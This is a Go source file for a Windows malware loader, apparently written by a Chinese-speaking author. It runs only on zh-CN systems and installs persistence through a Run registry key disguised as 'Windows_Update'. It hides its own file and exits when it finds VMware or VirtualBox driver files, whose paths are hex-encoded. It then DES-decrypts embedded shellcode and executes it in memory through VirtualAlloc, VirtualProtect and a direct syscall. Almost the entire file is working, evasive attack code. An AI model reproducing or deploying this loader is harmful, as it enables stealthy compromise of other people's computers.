package main

import (
	"bytes"
	"crypto/des"
	"encoding/hex"
	"fmt"
	"golang.org/x/sys/windows"
	"math/rand"
	"os/exec"
	"strings"
	"time"
	//"net/http"
	"os"
	"syscall"
	"unsafe"
)

const (
	// MEM_COMMIT is a Windows constant used with Windows API calls
	MEM_COMMIT = 0x1000
	// MEM_RESERVE is a Windows constant used with Windows API calls
	MEM_RESERVE = 0x2000
	// PAGE_EXECUTE_READ is a Windows constant used with Windows API calls
	PAGE_EXECUTE_READ = 0x20
	// PAGE_READWRITE is a Windows constant used with Windows API calls
	PAGE_READWRITE = 0x04
)

func run(cmd string) {
	c := exec.Command("cmd", "/C", cmd)

	if err := c.Run(); err != nil {
		fmt.Println("Error: ", err)
	}
}

var (
	codes   = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
	codeLen = len(codes)
)

func RandNewStr(len int) string {
	data := make([]byte, len)
	rand.Seed(time.Now().UnixNano())

	for i := 0; i < len; i++ {
		idx := rand.Intn(codeLen)
		data[i] = byte(codes[idx])
	}

	return string(data)
}
func install() {
	if !(strings.Contains(os.Args[0], "server.exe")) {
		host, _ := os.Hostname()
		hostfile := "c:\\users\\" + host + "\\Update"
		run("mkdir " + hostfile)
		run("copy " + os.Args[0] + " " + hostfile + "\\server.exe")
		run("REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V Windows_Update /t REG_SZ /F /D " + hostfile + "\\server.exe")
		//run("\"c:\\Windows\\System32\\schtasks.exe\" /Create /SC ONSTART /TN " + RandNewStr(12) + " /RL HIGHEST /TR "+hostfile+"\\\\server.exe /IT")
		run("attrib +H +S " + os.Args[0])
	} else {
		fmt.Println("server.exe")
	}
}
func ZeroUnPadding(origData []byte) []byte {
	return bytes.TrimFunc(origData,
		func(r rune) bool {
			return r == rune(0)
		})
}
func encode(str string) string {
	s, _ := hex.DecodeString(str)
	return string(s)
}

func fack(path string) { //判断虚拟机关键文件是否存在
	b, _ := PathExists(path)
	if b {
		os.Exit(1) //退出进程
	}
}
func check() {
	fack(encode("433A5C77696E646F77735C53797374656D33325C447269766572735C566D6D6F7573652E737973"))
	fack(encode("433A5C77696E646F77735C53797374656D33325C447269766572735C766D747261792E646C6C"))
	fack(encode("433A5C77696E646F77735C53797374656D33325C447269766572735C564D546F6F6C73486F6F6B2E646C6C"))
	fack(encode("433A5C77696E646F77735C53797374656D33325C447269766572735C766D6D6F7573657665722E646C6C"))
	fack(encode("433A5C77696E646F77735C53797374656D33325C447269766572735C766D686766732E646C6C"))
	fack(encode("433A5C77696E646F77735C53797374656D33325C447269766572735C766D47756573744C69622E646C6C"))
	fack(encode("433A5C77696E646F77735C53797374656D33325C447269766572735C56426F784D6F7573652E737973"))
	fack(encode("433A5C77696E646F77735C53797374656D33325C447269766572735C56426F7847756573742E737973"))
	fack(encode("433A5C77696E646F77735C53797374656D33325C447269766572735C56426F7853462E737973"))
	fack(encode("433A5C77696E646F77735C53797374656D33325C447269766572735C56426F78566964656F2E737973"))
	fack(encode("433A5C77696E646F77735C53797374656D33325C76626F78646973702E646C6C"))
	fack(encode("433A5C77696E646F77735C53797374656D33325C76626F78686F6F6B2E646C6C"))
	fack(encode("433A5C77696E646F77735C53797374656D33325C76626F786F676C6572726F727370752E646C6C"))
	fack(encode("433A5C77696E646F77735C53797374656D33325C76626F786F676C706173737468726F7567687370752E646C6C"))
	fack(encode("433A5C77696E646F77735C53797374656D33325C76626F78736572766963652E657865"))
	fack(encode("433A5C77696E646F77735C53797374656D33325C76626F78747261792E657865"))
	fack(encode("433A5C77696E646F77735C53797374656D33325C56426F78436F6E74726F6C2E657865"))
}
func PathExists(path string) (bool, error) { //判断文件是否存在
	_, err := os.Stat(path)
	if err == nil {
		return true, nil
	}
	if os.IsNotExist(err) {
		return false, nil
	}
	return false, err
}

func Decrypt(decrypted string, key []byte) string { //des解密
	src, err := hex.DecodeString(decrypted)
	if err != nil {
		return ""
	}
	block, err := des.NewCipher(key)
	if err != nil {
		return ""
	}
	out := make([]byte, len(src))
	dst := out
	bs := block.BlockSize()
	if len(src)%bs != 0 {
		return ""
	}
	for len(src) > 0 {
		block.Decrypt(dst, src[:bs])
		src = src[bs:]
		dst = dst[bs:]
	}
	out = ZeroUnPadding(out)
	return string(out)
}

var code string
var deskey string

//var runtime time.Duration
func main() {
	a, err := windows.GetUserPreferredUILanguages(windows.MUI_LANGUAGE_NAME)
	if err == nil {
		if a[0] != "zh-CN" {
			fmt.Printf("当前不是中文系统")
			os.Exit(1)
		} else {
			go install()
			key := []byte(deskey)
			//ncode, _ := Decrypt(code, key)
			fmt.Printf("\nok")
			check()
			//code := getcode()
			// Pop Calc Shellcode
			time.Sleep(10 * time.Second) //延时时间
			shellcode, errShellcode := hex.DecodeString(Decrypt(code, key))
			if errShellcode != nil {
			}
			kernel32 := windows.NewLazySystemDLL("kernel32.dll")
			ntdll := windows.NewLazySystemDLL("ntdll.dll")
			VirtualAlloc := kernel32.NewProc("VirtualAlloc")
			VirtualProtect := kernel32.NewProc("VirtualProtect")
			RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
			addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

			if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {

			}

			_, _, errRtlCopyMemory := RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

			if errRtlCopyMemory != nil && errRtlCopyMemory.Error() != "The operation completed successfully." {
			}
			oldProtect := PAGE_READWRITE
			_, _, errVirtualProtect := VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))

			if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {

			}
			_, _, errSyscall := syscall.Syscall(addr, 0, 0, 0, 0)
			if errSyscall != 0 {
			}

		}
	}
}
